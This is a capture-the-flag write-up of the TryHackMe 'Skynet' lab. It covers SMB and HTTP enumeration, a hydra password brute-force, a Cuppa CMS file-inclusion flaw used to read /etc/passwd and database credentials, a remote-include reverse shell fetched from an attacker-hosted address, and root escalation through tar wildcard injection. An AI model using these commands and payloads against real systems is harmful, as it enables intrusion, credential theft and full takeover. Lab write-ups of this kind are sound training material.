# Skynet: Write-up
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Web / Network Exploitation  

---

## Enumeration

### Nmap Scan Results
```bash
└─$ nmap -sS -sV -T4 --top-ports 10000 <TARGET_IP>
```

**Observed Services:**
- **22/tcp:** OpenSSH 7.2p2 (Ubuntu)
- **80/tcp:** Apache httpd 2.4.18
- **110/143/993/995:** POP3/IMAP (Dovecot)
- **139/445:** Samba (smbd 3.X: 4.X)

> **Conclusion:** Focus shifted to HTTP + SMB, since SMB allowed anonymous access and HTTP hosted SquirrelMail/CMS.

---

## SMB Enumeration

Listing shares confirmed anonymous access was enabled:
```bash
└─$ smbclient -L //<TARGET_IP>/ -N
```

**Accessing the Anonymous Share:**
Connected to the share without credentials and retrieved the following files:
```bash
└─$ smbclient //<TARGET_IP>/anonymous -N
smb: \> get attention.txt
smb: \> get logs/log1.txt
```

* `attention.txt`: A note regarding a recent system-wide password reset.
* `logs/log1.txt`: A password wordlist generated following the reset.

---

## Initial Access

### Password Brute-force (SquirrelMail)
Using the username `milesdyson` and the wordlist found on the SMB share, a password brute-force attack was performed against the SquirrelMail login endpoint:

```bash
└─$ hydra -l milesdyson -P log1.txt <TARGET_IP> http-post-form "/squirrelmail/src/redirect.php:[REDACTED_POST_BODY]:Unknown user or password incorrect"
```
**Valid Credentials Found:** `milesdyson : [REDACTED_PASS]`

### Mailbox Analysis (Evidence)
Accessing the SquirrelMail interface revealed a critical automated email:

> **Subject:** SMB password reset
> **From:** skynet@skynet.thm
> 
> "Your new SMB password for the milesdyson share is: **[REDACTED_SMB_PASS]**"

### Authenticated SMB Access & Discovery
Using the recovered SMB password, I accessed Miles's personal share and retrieved `notes/important.txt`:

```text
1. Add features to beta CMS /<HIDDEN_PATH>/
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

---

## CMS Exploitation (Cuppa CMS)

The directory `/<HIDDEN_PATH>/` leads to an installation of **Cuppa CMS**. 

### Vulnerability: LFI / Arbitrary File Read
The application does not validate or restrict file paths in the `urlConfig` parameter within `/administrator/alerts/alertConfigField.php`, allowing for Local File Inclusion (LFI).

**Proof of Concept (/etc/passwd):**
`GET /<HIDDEN_PATH>/administrator/alerts/alertConfigField.php?urlConfig=/etc/passwd`

**Output (Redacted):**
```text
root:x:0:0:root:/root:/bin/bash
milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash
```

### Configuration Exfiltration
By leveraging the `php://filter` wrapper, I exfiltrated the encoded contents of `Configuration.php`:

`GET /<HIDDEN_PATH>/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php`

**Decoded Credentials:**
- **Database User:** `root`
- **Database Pass:** `[REDACTED_DB_PASS]`

### Remote Code Execution (RCE)
The environment appeared to have `allow_url_include` enabled, as remote paths were successfully processed by the application.

1.  **Host Payload:** Attacker hosts a PHP reverse shell (e.g., `shell.txt`).
2.  **Execution:**
    `GET /<HIDDEN_PATH>/administrator/alerts/alertConfigField.php?urlConfig=http://<ATTACKER_IP>/shell.txt`
3.  **Result:** Obtained a reverse shell as `www-data`. Validated execution context with `id` (uid=33).

---

## Privilege Escalation

### Wildcard Injection in Tar
A system-wide cron job was identified running as root:
```bash
# /home/milesdyson/backups/backup.sh
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

**Exploit Rationale:** The `tar` command uses a wildcard (`*`) expanded by the shell. Since `tar` interprets filenames starting with `--` as command-line flags, an attacker with write access to `/var/www/html` can perform an **Option Injection**.

### Execution Chain (Root)
```bash
# 1. Create the exploit script
echo "chmod +s /bin/bash" > exploit.sh

# 2. Inject tar options via filenames
touch ./"--checkpoint=1"
touch ./"--checkpoint-action=exec=sh exploit.sh"
```

After the cron job executed (1-minute interval):
```bash
└─$ /bin/bash -p
bash-4.3# id
uid=0(root)  # Elevated privileges confirmed
```

**Root Flag:** `THM{[REDACTED_FLAG]}`

---

